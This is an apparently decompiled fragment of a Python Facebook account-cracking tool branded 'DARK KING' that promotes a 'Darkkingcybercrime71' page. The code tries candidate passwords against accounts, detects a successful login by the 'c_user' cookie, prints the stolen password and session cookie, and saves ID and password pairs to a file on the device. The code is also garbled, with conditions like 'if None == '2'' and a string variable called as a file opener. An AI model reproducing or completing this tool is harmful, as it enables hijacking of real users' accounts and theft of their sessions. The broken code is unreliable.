...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/Darkkingcybercrime71?mibextid=ZbWKwL')
        return None
    if None == '3':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32m𝐃𝐀𝐑𝐊 🎭 𝐊𝐈𝐍𝐆-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🎭🎭]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
